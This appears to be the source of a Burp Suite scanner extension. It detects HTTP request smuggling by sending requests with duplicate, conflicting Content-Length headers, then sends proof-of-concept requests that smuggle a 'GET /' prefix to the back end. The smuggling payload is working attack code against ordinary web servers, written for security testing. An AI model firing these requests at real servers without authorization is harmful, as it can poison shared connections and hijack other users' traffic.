package burp;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.List;

public class DualContentScan extends SmuggleScanBox implements IScannerCheck  {

    DualContentScan(String name) {
        super(name);
    }


    byte[] dualContent(byte[] baseReq, int offset1, int offset2) {
        int contentLength = baseReq.length - Utilities.getBodyStart(baseReq); // Integer.parseInt(Utilities.getHeader(baseReq, "Content-Length"));

        String off1 = String.valueOf(contentLength+offset1);
        String off2 = String.valueOf(contentLength+offset2);
        if (offset1 == offset2) {
            off2 = "0"+off2;
        }

        baseReq = Utilities.addOrReplaceHeader(baseReq, "content-Length", off1);
        baseReq = Utilities.addOrReplaceHeader(baseReq, "content-length", off2);
        baseReq = Utilities.replace(baseReq, "Content-Length".getBytes(), "oldContent-Length".getBytes());
        return baseReq;
    }

    @Override
    List<IScanIssue> doScan ( byte[] baseReq, IHttpService service){
        if (Utilities.globalSettings.getBoolean("avoid rescanning vulnerable hosts") && BurpExtender.hostsToSkip.containsKey(service.getProtocol()+service.getHost())) {
            return null;
        }

        if (baseReq[0] == 'G') {
            baseReq = Utilities.helpers.toggleRequestMethod(baseReq);
        }

        IParameter notEmpty = burp.Utilities.helpers.buildParameter("notempty", "1", IParameter.PARAM_BODY);
        baseReq = Utilities.helpers.addParameter(baseReq, notEmpty);

        byte[] noAttack = dualContent(baseReq, 0, 0);

        Resp baseline = request(service, noAttack);
        if (baseline.timedOut()) {
            return null;
        }

        Resp firstHeader = request(service, dualContent(baseReq, 1, 0));
        if (firstHeader.getStatus() == baseline.getStatus()) {
            return null;
        }

        Resp secondHeader = request(service, dualContent(baseReq, 0, 1));
        if (secondHeader.getStatus() == baseline.getStatus()) {
            return null;
        }

        // we rely on a timeout because so many servers just reject non-matching CL
        // it would be interesting to spot servers with different timeouts for firstHeader vs secondHeader
        // "HTTP Error 400. The request has an invalid header name." => microsoft doesn't like dupe headers with different values
        if (firstHeader.getStatus() == secondHeader.getStatus()) {
            if (firstHeader.timedOut()) {
                report("CL-CL: x-T-T", "X:Y:Y", baseline, firstHeader, secondHeader);
            } else {
                return null;
            }
        } else {
            if (firstHeader.timedOut() || secondHeader.timedOut()) {
                report("CL-CL: x-y-T", "X:Y:Z", baseline, firstHeader, secondHeader);
            } else {
                report("CL-CL: x-y-z", "X:Y:Z", baseline, firstHeader, secondHeader);
            }
        }


        try {
            byte[] prefix = "GET / HTTP/1.1\r\nFoo: ba".getBytes();
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            stream.write(baseReq);
            stream.write(prefix);
            byte[] attack = stream.toByteArray();
            sendPoc("CL-CL-1", dualContent(attack, 0, -prefix.length), baseReq, service);
            sendPoc("CL-CL-2", dualContent(attack, -prefix.length, 0), baseReq, service);

        } catch (IOException e) {

        }
        BurpExtender.hostsToSkip.put(service.getProtocol()+service.getHost(), true);
        return null;
    }
}